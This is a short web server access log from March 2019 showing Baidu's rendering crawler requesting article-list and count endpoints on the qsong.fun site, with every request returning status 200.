111.206.198.47 - - [25/Mar/2019:16:19:14 +0800] "GET /article/getArticleList?ps=5&pn=1&sort=read HTTP/1.1" 200 4358 "http://www.qsong.fun/static/qsong/html/home.html" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
111.206.198.109 - - [25/Mar/2019:16:19:14 +0800] "GET /article/getArticleList?type=dz&ps=1&pn=1 HTTP/1.1" 200 1252 "http://www.qsong.fun/static/qsong/html/home.html" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
111.206.198.85 - - [25/Mar/2019:16:19:14 +0800] "GET /article/getRandArticle HTTP/1.1" 200 4123 "http://www.qsong.fun/static/qsong/html/home.html" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
111.206.221.15 - - [25/Mar/2019:16:19:14 +0800] "GET /article/getArticleList?type=video&ps=1&pn=1&sort=read HTTP/1.1" 200 1024 "http://www.qsong.fun/static/qsong/html/home.html" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
111.206.221.87 - - [25/Mar/2019:16:19:14 +0800] "GET /article/getArticleList?ps=10&pn=1 HTTP/1.1" 200 8622 "http://www.qsong.fun/static/qsong/html/home.html" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
111.206.221.42 - - [25/Mar/2019:16:19:14 +0800] "GET /article/getArticleList?type=notice&ps=5&pn=1 HTTP/1.1" 200 1590 "http://www.qsong.fun/static/qsong/html/home.html" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
111.206.198.17 - - [25/Mar/2019:16:19:14 +0800] "GET /article/getCountInfo HTTP/1.1" 200 282 "http://www.qsong.fun/static/qsong/html/home.html" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
111.206.198.120 - - [25/Mar/2019:16:19:17 +0800] "GET /article/getArticleList?type=dz&ps=1&pn=1 HTTP/1.1" 200 1252 "http://www.qsong.fun/static/qsong/html/home.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)"
